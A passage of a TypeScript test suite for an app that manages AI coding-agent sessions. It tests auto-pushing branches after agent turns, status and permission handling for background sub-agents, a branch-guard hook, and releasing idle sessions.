            pushes.push([...args])
            return push()
          }
        }
      })
      const chat = await setup.service.openChat(setup.workspaceId)
      const branch = (await setup.service.listWorkspaces(setup.projectId))[0]?.branch
      return {
        ...setup,
        chat,
        branch,
        pushes,
        moveOrigin: (url) => {
          origin = url
        }
      }
    }

    it('is pushed by the app once it ends well', async () => {
      const { service, chat, branch, pushes } = await recording()
      await service.sendToChat(chat.id, 'fix the checks', { instruction: 'fixChecks' })
      agent().emit(initMessage)
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(pushes).toEqual([['push', '-u', 'origin', branch]])
      })
    })

    it('is pushed after its own turn, even with a message typed behind it', async () => {
      const { service, chat, pushes } = await recording()
      await service.sendToChat(chat.id, 'answer the review', { instruction: 'addressReview' })
      agent().emit(initMessage)
      await service.sendToChat(chat.id, 'and something else')
      agent().emit(lifecycle('typed', 'queued'))
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(pushes).toHaveLength(1)
      })
      agent().emit(lifecycle('typed', 'started'))
      agent().emit(resultMessage)
      await service.closeChats()
      expect(pushes).toHaveLength(1)
    })

    it('is refused while another turn is running, so the turn that ends is its own', async () => {
      const { service, chat, pushes } = await recording()
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)

      await expect(
        service.sendToChat(chat.id, 'resolve the conflicts', { instruction: 'resolveConflicts' })
      ).rejects.toMatchObject({ code: 'turnRunning' })
      agent().emit(resultMessage)
      await service.closeChats()
      expect(pushes).toEqual([])
    })

    it('is never pushed for a prompt that changes nothing, or a message typed into the chat', async () => {
      const { service, chat, pushes } = await recording()
      await service.sendToChat(chat.id, 'review it', { instruction: 'review' })
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await service.sendToChat(chat.id, 'work')
      agent().emit(resultMessage)
      await service.closeChats()
      expect(pushes).toEqual([])
    })

    it('is not pushed when the turn fails', async () => {
      const { service, chat, pushes } = await recording()
      await service.sendToChat(chat.id, 'fix the checks', { instruction: 'fixChecks' })
      agent().emit(initMessage)
      agent().emit(abortedResultMessage)
      // The entry went with the failed turn, so the next one pushes nothing.
      agent().emit(resultMessage)
      await service.closeChats()
      expect(pushes).toEqual([])
    })

    it('is not pushed by the session that replaced the one it was sent to', async () => {
      const { service, chat, pushes } = await recording()
      await service.sendToChat(chat.id, 'fix the checks', { instruction: 'fixChecks' })
      agent().emit(initMessage)
      agent().finish(new Error('the process died'))
      await vi.waitFor(() => {
        expect(service.listChats(chat.workspaceId)[0]?.status).toBe('error')
      })

      await service.setChatAutoCompact(chat.id, 400_000)
      expect(agents).toHaveLength(2)
      await service.sendToChat(chat.id, 'something else')
      agents[1]?.emit(initMessage)
      agents[1]?.emit(resultMessage)
      await service.closeChats()
      expect(pushes).toEqual([])
    })

    it('is not pushed once it was stopped', async () => {
      const { service, chat, pushes } = await recording()
      await service.sendToChat(chat.id, 'fix the checks', { instruction: 'fixChecks' })
      agent().emit(initMessage)
      await service.interruptChat(chat.id)
      agent().emit(resultMessage)
      await service.closeChats()
      expect(pushes).toEqual([])
    })

    it('is not pushed when origin was pointed somewhere else during the turn, and says so', async () => {
      const { service, chat, pushes, events, moveOrigin } = await recording()
      await service.sendToChat(chat.id, 'fix the checks', { instruction: 'fixChecks' })
      agent().emit(initMessage)
      moveOrigin('https://example.com/elsewhere.git')
      agent().emit(resultMessage)
      await service.closeChats()

      expect(pushes).toEqual([])
      expect(events).toContainEqual(
        expect.objectContaining({
          chatId: chat.id,
          event: expect.objectContaining({ type: 'error' }) as unknown
        })
      )
    })

    it('says so in the conversation when the push fails', async () => {
      const { service, chat, events } = await recording(() =>
        Promise.reject(new Error('rejected: non-fast-forward'))
      )
      await service.sendToChat(chat.id, 'fix the checks', { instruction: 'fixChecks' })
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await service.closeChats()

      expect(events).toContainEqual(
        expect.objectContaining({
          chatId: chat.id,
          event: expect.objectContaining({ type: 'error' }) as unknown
        })
      )
    })
  })

  /*
   * A message sent while the agent works and not folded into that turn — and
   * after a Stop, always — is run by the CLI as a turn of its own once the
   * first one has ended. Measured on a live session: the turn's result, then
   * `completed` or `cancelled` for the message that started it, then `started`
   * for the one that waited. Only `sendToChat` used to say `running`, so that
   * second turn ran under an idle tab with no Stop.
   */
  describe('a turn the agent starts from its queue', () => {
    it('is shown as running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      agent().emit(lifecycle('first', 'completed'))
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      agent().emit(lifecycle('waited', 'started'))

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      })
    })

    // `completed` and `cancelled` arrive after the result as well, and they
    // end a turn rather than start one.
    it('is not imagined from a message that finished', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      agent().emit(lifecycle('first', 'cancelled'))
      agent().emit(lifecycle('first', 'completed'))

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      // Long enough for a status write those frames started to have landed.
      await new Promise((resolve) => setTimeout(resolve, 50))
      expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
    })

    /*
     * Known at the result: a message is still held, so another turn follows at
     * once. Writing `idle` and then `running` a state write later flashed a
     * "finished" dot and toast over a tab that was still working.
     */
    it('stays running through a turn that ends with a message still held', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(lifecycle('waited', 'queued'))
      agent().emit(resultMessage)
      // Long enough for an `idle` write the result started to have landed.
      await new Promise((resolve) => setTimeout(resolve, 50))
      expect(service.listChats(workspaceId)[0]?.status).toBe('running')

      agent().emit(lifecycle('waited', 'started'))
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
    })

    // A failure is news even with another turn to come.
    it('still says a turn failed with a message held', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(lifecycle('waited', 'queued'))
      agent().emit(abortedResultMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('error')
      })
    })

    // The queue lives in the process: a session ended holding a message
    // leaves nothing that would keep the next one's chat running.
    it('forgets what an ended session held', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(lifecycle('lost', 'queued'))
      agent().emit(abortedResultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('error')
      })
      // A window chosen while nothing runs starts the session over.
      await service.setChatAutoCompact(chat.id, 600_000)
      expect(agents).toHaveLength(2)

      await service.sendToChat(chat.id, 'more')
      agents[1]?.emit(initMessage)
      agents[1]?.emit(resultMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
    })
  })

  /*
   * Agents the conversation sent off to work on their own.
   *
   * The turn that launched them ends at once — the call answers
   * `async_launched` — while they go on for minutes. The result used to set
   * the conversation idle there and then, and the workspace list said
   * "Finished" over agents that were still working.
   */
  describe('agents in the background', () => {
    const started = (
      taskId: string,
      toolUseId: string,
      extra: Record<string, unknown> = {}
    ): SDKMessage =>
      ({
        type: 'system',
        subtype: 'task_started',
        task_id: taskId,
        tool_use_id: toolUseId,
        description: `Agent ${taskId}`,
        subagent_type: 'Explore',
        is_backgrounded: true,
        task_type: 'local_agent',
        uuid: 'frame',
        session_id: 'sess-1',
        ...extra
      }) as unknown as SDKMessage

    const progress = (taskId: string, description: string): SDKMessage =>
      ({
        type: 'system',
        subtype: 'task_progress',
        task_id: taskId,
        description,
        usage: { total_tokens: 1200, tool_uses: 2, duration_ms: 900 },
        uuid: 'frame',
        session_id: 'sess-1'
      }) as unknown as SDKMessage

    const notified = (taskId: string, status = 'completed'): SDKMessage =>
      ({
        type: 'system',
        subtype: 'task_notification',
        task_id: taskId,
        status,
        output_file: '/tmp/out',
        summary: 'All read.',
        usage: { total_tokens: 4800, tool_uses: 5, duration_ms: 3100 },
        uuid: 'frame',
        session_id: 'sess-1'
      }) as unknown as SDKMessage

    const alive = (...taskIds: string[]): SDKMessage =>
      ({
        type: 'system',
        subtype: 'background_tasks_changed',
        tasks: taskIds.map((task_id) => ({ task_id, task_type: 'local_agent', description: '' })),
        uuid: 'frame',
        session_id: 'sess-1'
      }) as unknown as SDKMessage

    const launched = (toolUseId: string): SDKMessage =>
      ({
        type: 'user',
        message: {
          content: [
            { type: 'tool_result', tool_use_id: toolUseId, content: 'Async agent launched' }
          ]
        },
        tool_use_result: {
          status: 'async_launched',
          isAsync: true,
          resolvedModel: 'claude-haiku-5-5'
        },
        parent_tool_use_id: null,
        uuid: 'u-launched',
        session_id: 'sess-1'
      }) as unknown as SDKMessage

    /** A turn that sent one agent off and ended, with the agent still going. */
    async function withAgentAway(extra: ServiceOptions = {}): Promise<{
      service: OctopusService
      workspaceId: string
      chatId: string
      events: ChatEvent[]
    }> {
      const { service, workspaceId, events } = await withWorkspace(extra)
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(toolCallMessage('call-1', 'Agent', { description: 'Look', prompt: 'look' }))
      agent().emit(alive('task-1'))
      agent().emit(started('task-1', 'call-1'))
      agent().emit(launched('call-1'))
      agent().emit(resultMessage)
      return { service, workspaceId, chatId: chat.id, events }
    }

    const settle = (): Promise<unknown> => new Promise((resolve) => setTimeout(resolve, 50))

    it('stays working while an agent it sent off is still running', async () => {
      const { service, workspaceId } = await withAgentAway()
      await settle()

      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    it('finishes once the last agent has ended', async () => {
      const { service, workspaceId } = await withAgentAway()
      agent().emit(notified('task-1'))
      agent().emit(alive())

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
    })

    // The CLI hands a finished agent's report to the main agent in a turn of
    // its own, which nobody sent a message for.
    it('works through the turn the CLI starts to read a report', async () => {
      const { service, workspaceId } = await withAgentAway()
      agent().emit(notified('task-1'))
      agent().emit(alive())
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      agent().emit(initMessage)
      agent().emit(textMessage('The agent found three files.'))
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      })

      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
    })

    // Ending the agents is not ending the turn: one that ends while the main
    // agent is still writing leaves the conversation working.
    it('keeps working when the agents end inside a turn', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(started('task-1', 'call-1'))
      agent().emit(notified('task-1'))
      agent().emit(alive())
      await settle()

      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    it('lists what each agent is doing and on which model', async () => {
      const { service, chatId } = await withAgentAway()
      agent().emit(progress('task-1', 'Reading src/a.ts'))

      await vi.waitFor(() => {
        const [entry] = service.listTasks()
        expect(entry?.chatId).toBe(chatId)
        expect(entry?.tasks).toEqual([
          expect.objectContaining({
            taskId: 'task-1',
            toolUseId: 'call-1',
            status: 'running',
            subagentType: 'Explore',
            model: 'claude-haiku-5-5',
            activity: 'Reading src/a.ts',
            tokens: 1200
          })
        ])
      })
    })

    /*
     * A push per progress frame would be one per tool call per agent, and a
     * workflow runs dozens: frames that land together go out as one.
     */
    it('announces a burst of progress once', async () => {
      const { service } = await withAgentAway()
      await settle()
      const pushed: TasksEvent[] = []
      service.onTasks((event) => pushed.push(event))

      agent().emit(progress('task-1', 'Reading a'))
      agent().emit(progress('task-1', 'Reading b'))
      agent().emit(progress('task-1', 'Reading c'))

      await vi.waitFor(() => {
        expect(pushed).toHaveLength(1)
      })
      expect(pushed[0]?.tasks[0]?.activity).toBe('Reading c')
    })

    it('tells a window that stopped listening nothing more', async () => {
      const { service } = await withAgentAway()
      await settle()
      const pushed: TasksEvent[] = []
      const stop = service.onTasks((event) => pushed.push(event))

      stop()
      agent().emit(notified('task-1'))
      await settle()

      expect(pushed).toEqual([])
    })

    // The log draws the agent's row the moment its start is recorded, and the
    // map has to know of it by then or the row would read as interrupted.
    it('announces an agent starting at once, ahead of the event', async () => {
      const { service, workspaceId } = await withWorkspace()
      const order: string[] = []
      service.onTasks(() => order.push('tasks'))
      service.onAgentEvent(({ event }) => {
        if (event.type === 'task_started') order.push('event')
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(started('task-1', 'call-1'))

      await vi.waitFor(() => {
        expect(order).toEqual(['tasks', 'event'])
      })
    })

    it('stops one agent and leaves the rest', async () => {
      const { service, chatId } = await withAgentAway()
      await settle()

      await service.stopTask(chatId, 'task-1')

      expect(agent().stoppedTasks()).toEqual(['task-1'])
      expect(agent().interrupted()).toBe(0)
    })

    // The click was behind the push that said the agent had ended.
    it('takes a Stop for an agent that is already over as done', async () => {
      const { service, chatId } = await withAgentAway()
      agent().emit(notified('task-1'))
      await settle()

      await service.stopTask(chatId, 'task-1')
      await service.stopTask(chatId, 'task-unknown')

      expect(agent().stoppedTasks()).toEqual([])
    })

    // With a Stop for each task, the conversation's own Stop ends the turn
    // only, and the agents it had sent off go on — so it is still working.
    it('stays working after Stop while agents run on', async () => {
      const { service, workspaceId, chatId } = await withAgentAway()
      await settle()

      await service.interruptChat(chatId)

      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    it('asks the session not to kill its agents on Stop', async () => {
      await withAgentAway()

      expect(agent().options()).toMatchObject({
        perTaskStopAffordance: true,
        agentProgressSummaries: true
      })
    })

    /*
     * A question from an agent belongs to that agent, not to the turn that
     * launched it. Ending the turn used to refuse every open question, which
     * would have refused the agent's too — and the agent would have read the
     * refusal as an answer.
     */
    it("keeps an agent's question open when the turn ends", async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(started('task-1', 'call-1'))

      let answered = false
      void agent()
        .ask('Bash', { command: 'ls' }, undefined, undefined, { agentID: 'task-1' })
        .then(() => {
          answered = true
        })
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('waiting_permission')
      })

      agent().emit(resultMessage)
      await settle()

      expect(answered).toBe(false)
      expect(service.pendingPermissions(chat.id)).toHaveLength(1)
      expect(service.listChats(workspaceId)[0]?.status).toBe('waiting_permission')
      expect(service.listTasks()[0]?.tasks[0]?.waiting).toBe(true)
    })

    it('names the agent that is asking', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(started('task-1', 'call-1'))

      void agent().ask('Bash', { command: 'ls' }, undefined, undefined, { agentID: 'task-1' })

      await vi.waitFor(() => {
        expect(events.map(({ event }) => event)).toContainEqual(
          expect.objectContaining({ type: 'permission_request', taskId: 'task-1' })
        )
      })
    })

    /*
     * Two agents asking at once, and the conversation itself: one agent ends,
     * and only its question goes with it. The other agent's stays, and so does
     * the turn's own until the turn ends.
     */
    it("lets an agent's question go with that agent and no other", async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(started('task-1', 'call-1'))
      agent().emit(started('task-2', 'call-2'))

      const settled: string[] = []
      const ask = (who: string, agentID?: string): void => {
        void agent()
          .ask('Bash', { command: who }, undefined, undefined, {
            ...(agentID !== undefined && { agentID })
          })
          .then(() => settled.push(who))
      }
      ask('turn')
      ask('first', 'task-1')
      ask('second', 'task-2')
      await vi.waitFor(() => {
        expect(service.listTasks()[0]?.tasks.map((task) => task.waiting)).toEqual([true, true])
      })

      agent().emit(notified('task-1', 'failed'))
      await vi.waitFor(() => {
        expect(settled).toEqual(['first'])
      })
      expect(service.listTasks()[0]?.tasks.map((task) => task.waiting)).toEqual([false, true])
    })

    // A failed turn is news, and agents ending afterwards do not paint over it.
    it('leaves a failed turn red when its agents end', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(started('task-1', 'call-1'))
      agent().emit(abortedResultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('error')
      })

      agent().emit(notified('task-1'))
      await settle()

      expect(service.listChats(workspaceId)[0]?.status).toBe('error')
    })

    // The process went down, and everything it ran went with it.
    it('ends every agent when the session fails', async () => {
      const { service } = await withAgentAway()
      agent().finish(new Error('exited with code 1'))

      await vi.waitFor(() => {
        expect(service.listTasks()[0]?.tasks[0]?.status).toBe('stopped')
      })
    })

    it('forgets the agents of a conversation that is closed', async () => {
      const { service, workspaceId, chatId } = await withAgentAway()
      await service.createChat(workspaceId)
      await settle()

      const pushed: TasksEvent[] = []
      service.onTasks((event) => pushed.push(event))

      await service.closeChat(chatId)

      expect(service.listTasks()).toEqual([])
      // The windows drop its rows, and the push that was gathering never comes.
      await new Promise((resolve) => setTimeout(resolve, 300))
      expect(pushed).toEqual([{ chatId, workspaceId, tasks: [], mainWorking: false }])
    })

    // A closing session still speaks for a moment, and what it says about its
    // agents must not bring back what closing it forgot.
    it('does not bring back the agents of a closed conversation', async () => {
      const { service, workspaceId, chatId } = await withAgentAway()
      await service.createChat(workspaceId)
      await settle()

      await service.closeChat(chatId)
      agent().emit(started('task-late', 'call-late'))
      agent().emit(textMessage('still talking'))
      await settle()

      expect(service.listTasks()).toEqual([])
    })

    /*
     * An agent's question outlives the turn, so the window keeps its card —
     * and only an event can tell it the agent has gone and the buttons reach
     * nothing. The amber goes with it.
     */
    it('withdraws the question of an agent that ends, and stops waiting', async () => {
      const { service, workspaceId, events } = await withAgentAway()
      agent().emit(started('task-2', 'call-2'))
      await settle()
      void agent().ask('Bash', { command: 'ls' }, undefined, undefined, { agentID: 'task-1' })
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('waiting_permission')
      })
      const asked = events.find(({ event }) => event.type === 'permission_request')?.event
      if (asked?.type !== 'permission_request') throw new Error('no question')

      agent().emit(notified('task-1', 'killed'))

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      })
      expect(events.map(({ event }) => event)).toContainEqual({
        type: 'permission_withdrawn',
        requestId: asked.requestId
      })
    })

    it('rests once the last agent ends with its question open', async () => {
      const { service, workspaceId } = await withAgentAway()
      await settle()
      void agent().ask('Bash', { command: 'ls' }, undefined, undefined, { agentID: 'task-1' })
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('waiting_permission')
      })

      agent().emit(notified('task-1', 'killed'))

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
    })

    // A message still queued is a turn about to start: resting in between
    // would flash the tab idle and say "done" for nothing.
    it('does not rest between a turn and the message queued behind it', async () => {
      const { service, workspaceId } = await withAgentAway()
      agent().emit({
        type: 'command_lifecycle',
        command_uuid: 'queued-1',
        state: 'queued',
        uuid: 'frame',
        session_id: 'sess-1'
      } as unknown as SDKMessage)
      await settle()

      agent().emit(notified('task-1'))
      await settle()

      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    /*
     * The CLI opens a turn of its own to deliver each finished agent's report,
     * so one piece of work ends in several results. "Done" is the moment the
     * last of it is over, said once.
     */
    it('says it is finished once, when nothing is left working', async () => {
      const { service, workspaceId, events } = await withAgentAway({ finishedAfterMs: 200 })
      const finished = (): number => events.filter(({ event }) => event.type === 'finished').length

      // The agent ending is not the end: its report is handed over in a turn
      // of its own, which opens a moment later — as measured, with an init.
      agent().emit(notified('task-1'))
      agent().emit(alive())
      agent().emit(initMessage)
      // The model takes its time over the report before saying anything.
      await new Promise((resolve) => setTimeout(resolve, 300))
      agent().emit(textMessage('The agent found three files.'))
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(finished()).toBe(1)
      })

      await new Promise((resolve) => setTimeout(resolve, 400))
      expect(finished()).toBe(1)
      expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
    })

    // Measured: an agent ending mid-turn is sometimes reported again in a turn
    // of its own just after the turn's result.
    it('waits out a report turn that follows the result', async () => {
      const { service, workspaceId, events } = await withWorkspace({ finishedAfterMs: 200 })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(started('task-1', 'call-1'))
      agent().emit(notified('task-1'))
      agent().emit(resultMessage)
      agent().emit(initMessage)
      agent().emit(textMessage('The agent is done.'))
      agent().emit(resultMessage)

      await new Promise((resolve) => setTimeout(resolve, 500))
      expect(events.filter(({ event }) => event.type === 'finished')).toHaveLength(1)
    })

    // Measured: two agents, a report turn for each; the first turn ends with
    // the second agent still at work.
    it('says nothing at a report turn while another agent works', async () => {
      const { events } = await withAgentAway({ finishedAfterMs: 20 })
      agent().emit(started('task-2', 'call-2'))
      agent().emit(notified('task-1'))
      agent().emit(textMessage('The first agent is done.'))
      agent().emit(resultMessage)
      await settle()

      expect(events.filter(({ event }) => event.type === 'finished')).toEqual([])
    })

    it('says a plain turn is finished as it ends', async () => {
      const { service, workspaceId, events } = await withWorkspace({ finishedAfterMs: 20 })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')
      agent().emit(initMessage)
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(events.map(({ event }) => event.type)).toContain('finished')
      })
    })

    // An agent stopped from the map need not be reported back at all: the
    // rest that follows is then the end.
    it('is done when the last agent ends and no report turn follows', async () => {
      const { events } = await withAgentAway({ finishedAfterMs: 50 })
      agent().emit(notified('task-1', 'killed'))

      await vi.waitFor(() => {
        expect(events.map(({ event }) => event.type)).toContain('finished')
      })
    })

    // A message sent the moment a turn ends is the conversation going on.
    it('is not done when a message is sent straight after the turn', async () => {
      const { service, workspaceId, events } = await withWorkspace({ finishedAfterMs: 200 })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await settle()
      await service.sendToChat(chat.id, 'and another thing')
      await new Promise((resolve) => setTimeout(resolve, 300))

      expect(events.map(({ event }) => event.type)).not.toContain('finished')
    })

    // Closed, or the application quitting: a "done" nobody will see is dropped.
    it('drops a done still waiting when the conversation closes', async () => {
      const { service, workspaceId, events } = await withWorkspace({ finishedAfterMs: 200 })
      const chat = await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await settle()

      await service.closeChat(chat.id)
      await new Promise((resolve) => setTimeout(resolve, 300))

      expect(events.map(({ event }) => event.type)).not.toContain('finished')
    })

    // Only while there are agents can `running` mean the agents alone, and the
    // composer has to know which, to offer Send rather than a Stop for nothing.
    it('tells the windows whether the main agent is mid-turn', async () => {
      const { service, workspaceId } = await withWorkspace()
      const pushed: boolean[] = []
      service.onTasks((event) => pushed.push(event.mainWorking))
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'look around')
      agent().emit(initMessage)
      agent().emit(started('task-1', 'call-1'))
      await settle()
      expect(pushed).toEqual([true])

      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(pushed).toEqual([true, false])
      })
    })

    /*
     * An end the CLI never announced — a task that simply dropped off the
     * list of the living — is written down all the same, so the conversation
     * reopened tomorrow says how it ended rather than "stopped".
     */
    it('records an end nobody announced', async () => {
      const { service, chatId } = await withAgentAway()
      agent().emit(alive())

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chatId)
        expect(
          history.flatMap((entry) => (entry.role === 'agent' ? [entry.event] : []))
        ).toContainEqual({
          type: 'task_ended',
          taskId: 'task-1',
          status: 'completed'
        })
      })
    })

    // Measured: a workflow is started with no background flag and its call
    // returns at once; the list of the living is the only end it may get.
    it('settles a workflow that drops off the list unannounced', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'ultracode: read two files')
      agent().emit(initMessage)
      agent().emit(alive('wf-1'))
      agent().emit(
        started('wf-1', 'call-wf', { task_type: 'local_workflow', is_backgrounded: undefined })
      )
      agent().emit(resultMessage)
      await settle()
      expect(service.listChats(workspaceId)[0]?.status).toBe('running')

      agent().emit(alive())

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
    })
  })

  /*
   * The agent reads the window once, when a session starts — measured: a
   * window pushed onto a running session is taken and ignored. So the choice
   * reaches a conversation by starting its session again, and only when
   * nothing is in flight that the old process would take with it.
   */
  // One workspace, one pull request: the agent is kept on the branch the app
  // tracks, and on the new one after a rename.
  it('refuses a command that would take the agent off its branch', async () => {
    const { service, projectId, workspaceId } = await withWorkspace()
    const chat = await service.openChat(workspaceId)
    await service.sendToChat(chat.id, 'work')
    const hooks = agent().options().hooks as NonNullable<Options['hooks']>
    const [hook] = hooks.PreToolUse?.[0]?.hooks ?? []
    if (!hook) throw new Error('no guard')
    const decide = async (command: string): Promise<string> =>
      JSON.stringify(
        await hook({ tool_name: 'Bash', tool_input: { command } } as never, 'tool-1', {
          signal: new AbortController().signal
        })
      )

    expect(await decide('git checkout -b feat/elsewhere')).toContain('deny')

    await service.renameWorkspaceById(workspaceId, 'fix auth')
    const [renamed] = await service.listWorkspaces(projectId)
    expect(await decide(`git checkout ${renamed?.branch ?? ''}`)).toBe('{}')

    // A hook still held by a session whose workspace has gone guards nothing.
    await service.removeWorkspaceById(workspaceId, { deleteBranch: true })
    expect(await decide('git checkout -b feat/elsewhere')).toBe('{}')
  })

  /*
   * A session is a CLI process of a hundred megabytes and more, kept for as
   * long as its tab was open: a conversation that answered once in the
   * morning held its process all day. At rest long enough it is let go, and
   * the next message starts one again from the same id, as a restart does.
   */
  describe('a session at rest', () => {
    const SOON = { idleReleaseMs: 150, idleSweepMs: 20, readingFreshMs: 10_000 }

    async function resting(): Promise<{
      service: OctopusService
      workspaceId: string
      chatId: string
    }> {
      const { service, workspaceId } = await withWorkspace(SOON)
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
      return { service, workspaceId, chatId: chat.id }
    }

    const letGo = (): Promise<void> =>
      vi.waitFor(() => {
        expect(agents[0]?.closed()).toBe(1)
      })

    const after = (ms: number): Promise<void> =>
      new Promise((resolve) => {
        setTimeout(resolve, ms)
      })

    it('is let go once it has rested long enough, and the next message starts it again from its id', async () => {
      const { service, workspaceId, chatId } = await resting()

      await letGo()
      expect(service.listChats(workspaceId)[0]?.status).toBe('idle')

      await service.sendToChat(chatId, 'more')
      expect(agents).toHaveLength(2)
      expect(agents[1]?.options().resume).toBe('sess-1')
    })

    it('rests from its last word, not from its first', async () => {
      await resting()
      await after(60)
      agent().emit({
        type: 'system',
        subtype: 'commands_changed',
        commands: []
      } as unknown as SDKMessage)
      await after(60)

      expect(agents[0]?.closed()).toBe(0)
      await letGo()
    })

    it('is kept while a turn runs', async () => {
      const { service, workspaceId } = await withWorkspace(SOON)
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      })

      await after(300)

      expect(agents[0]?.closed()).toBe(0)
    })

    it('is kept while the account is being read through it', async () => {
      const { service } = await resting()
      let answer: (value: unknown) => void = () => undefined
      usageAnswer = () =>
        new Promise((resolve) => {
          answer = resolve
        })
      const read = service.refreshSubscriptionUsage()

      await after(300)
      expect(agents[0]?.closed()).toBe(0)

      answer(USAGE_RESPONSE)
      await read
      await letGo()
    })

    // Best effort, as a tab closing is: a process that will not die is not a
    // reason to keep its conversation from starting another.
    it('is let go even when its process will not close', async () => {
      const base = fakeQuery()
      const { service, workspaceId } = await withWorkspace({
        ...SOON,
        query: (...args) =>
          Object.assign(base(...args), {
            close: () => {
              throw new Error('the process would not die')
            }
          })
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      await after(300)
      await service.sendToChat(chat.id, 'more')

      expect(agents).toHaveLength(2)
    })

    // The strip above the composer would otherwise go blank until the next
    // message, where it had shown a figure a moment before.
    it('keeps answering the context reading it last gave', async () => {
      const { service, chatId } = await resting()
      const before = await service.sessionUsage(chatId)
      expect(before.context).not.toBeNull()

      await letGo()

      await expect(service.sessionUsage(chatId)).resolves.toEqual(before)
    })

    /*
     * With every session let go, the sidebar's timer would start a probe
     * every three minutes to read figures nobody has been moving — the very
     * process the release saved. A reading younger than the release stands
     * for the timer; a press is a question, and asks.
     */
    it('answers the timer from the reading kept, and a press by asking', async () => {
      const { service } = await resting()
